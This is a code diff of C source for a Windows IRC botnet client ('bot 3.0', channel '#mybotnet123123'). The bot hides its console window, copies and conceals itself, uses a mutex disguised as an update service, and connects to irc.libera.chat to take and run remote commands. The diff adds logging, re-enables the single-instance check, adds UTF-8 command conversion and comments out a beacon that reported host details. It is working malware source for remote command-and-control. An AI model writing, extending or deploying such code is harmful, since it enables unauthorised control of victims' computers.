@@ -8,50 +8,54 @@ BOOL is_already_running() {
     // 使用 Mutex 防止重复运行
     hMutex = CreateMutexW(NULL, FALSE, L"Global\\UpdateServiceMutex");
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
-        wprintf(L"[!] Another instance is already running.\n");
+        bot_log("[!] Another instance is already running.\n");
         return TRUE;
     }
     return FALSE;
 }
 
 
-
-
-
-
+const char* version = "bot 3.0";
+MessageBuffer msgBuffer;
+SOCKET ircsock;
  
 int main(int argc, char* argv[]) {
 
-    //Sleep(1000 * 2);
-
     if (!DEBUG) {
-        HWND hwnd = GetConsoleWindow();  // 获取控制台窗口句柄
+        HWND hwnd = GetConsoleWindow();  
         if (hwnd) {
             ShowWindow(hwnd, SW_HIDE);   // 隐藏窗口
         }
     }
 
+
+    init_log_path();
+    bot_log("version :%s",version);
+
+
+
+
     if (!is_hidden_bot() && HIDE_ON_ENTRY) {
-        printf("Starting to hide myself...\n");
+        bot_log("Starting to hide myself...\n");
         copy_and_hide_bot();
         WSACleanup();
         return 0;
     }
     else {
-        printf("Is hidden process, starting to run...\n");
+        bot_log("Is hidden process, starting to run...\n");
     }
 
-    //if (is_already_running())// fuck this
-    //    exit(0);
+    if (is_already_running())
+        exit(0);
 
     const char* owner = "#mybotnet123123";
     const char* channel = "#mybotnet123123";
     int reconnectAttempts = 0;
 
     while (reconnectAttempts <= MAX_RECONNECT_ATTEMPTS) {
-        SOCKET ircsock = TCPhandler("irc.libera.chat", "slave");
+        ircsock = TCPhandler("irc.libera.chat", "slave");
         if (ircsock == INVALID_SOCKET) {
-            printf("Failed to connect to IRC server. Attempt %d of %d...\n",
+            bot_log("Failed to connect to IRC server. Attempt %d of %d...\n",
                 reconnectAttempts + 1, MAX_RECONNECT_ATTEMPTS);
             reconnectAttempts++;
             Sleep(RECONNECT_INTERVAL);
@@ -63,26 +67,32 @@ int main(int argc, char* argv[]) {
         char joinCmd[128];
         snprintf(joinCmd, sizeof(joinCmd), "JOIN %s\r\n", channel);
         send(ircsock, joinCmd, (int)strlen(joinCmd), 0);
-        printf("[+] 已加入频道: %s\n", channel);
+        bot_log("[+] Joined channel: %s\n", channel);
 
-        // 发送上线提醒
-        char notice[512];
-        snprintf(notice, sizeof(notice), "PRIVMSG %s :Bot is online!\r\n", owner);
-        send(ircsock, notice, (int)strlen(notice), 0);
 
-        char buf[4096];
-        MessageBuffer msgBuffer;
+        char buf[DEFAULT_BUFLEN];
+
+
+        //snprintf(buf, sizeof(buf), "PRIVMSG %s :Bot is online!\r\n", owner);
+        //appendToBuffer(&msgBuffer, ircsock, buf);
+        //snprintf(buf, sizeof(buf), "AppData PATH : %s", appdata_path);
+        //appendToBuffer(&msgBuffer, ircsock, buf);
+        //snprintf(buf, sizeof(buf), "CodePage : %u", GetACP());
+        //appendToBuffer(&msgBuffer, ircsock, buf);
+        //flushBuffer(&msgBuffer, ircsock);
 
         while (1) {
             int n = recv(ircsock, buf, sizeof(buf) - 1, 0);
             if (n <= 0) {
-                printf("Connection closed by server.\n");
+                bot_log("Connection closed by server.\n");
                 closesocket(ircsock);
                 break;
             }
 
             buf[n] = '\0';  // Null-terminate
-            printf("Received:\n%s\n", buf);
+
+
+
 
             // 处理 PING/PONG
             if (strncmp(buf, "PING", 4) == 0) {
@@ -101,6 +111,18 @@ int main(int argc, char* argv[]) {
                 if (colon != NULL) {
                     char* command = colon + 1;
 
+                    // 新增：UTF-8转ANSI转换
+                    char ansiCommand[DEFAULT_BUFLEN]; // 确保足够大的缓冲区
+                    int res = Utf8ToAnsi(command, ansiCommand, sizeof(ansiCommand));
+                    if (res < 0) {
+                        bot_log("Error converting UTF-8 to ANSI: %d\n", res);
+                        continue; // 转换失败，跳过该命令
+                    }
+
+                    // 用转换后的ANSI字符串代替原始command
+                    command = ansiCommand;
+
+
                     // 去除前后空白字符
                     char* end = command + strlen(command);
                     while (end > command && (*(end - 1) == '\r' || *(end - 1) == '\n' || *(end - 1) == ' '))
@@ -109,6 +131,8 @@ int main(int argc, char* argv[]) {
 
                     // 初始化消息缓冲区
                     initMessageBuffer(&msgBuffer, owner);
+
+                    bot_log("Received Command:\n%s\n", command);
 
                     // 解析并执行命令
                     ParsedCommand parsedCmd = parsecommand(command);
@@ -139,7 +163,7 @@ int main(int argc, char* argv[]) {
 
         reconnectAttempts++;
         if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
-            printf("Reconnecting in %d seconds...\n", RECONNECT_INTERVAL / 1000);
+            bot_log("Reconnecting in %d seconds...\n", RECONNECT_INTERVAL / 1000);
             Sleep(RECONNECT_INTERVAL);
         }
     }
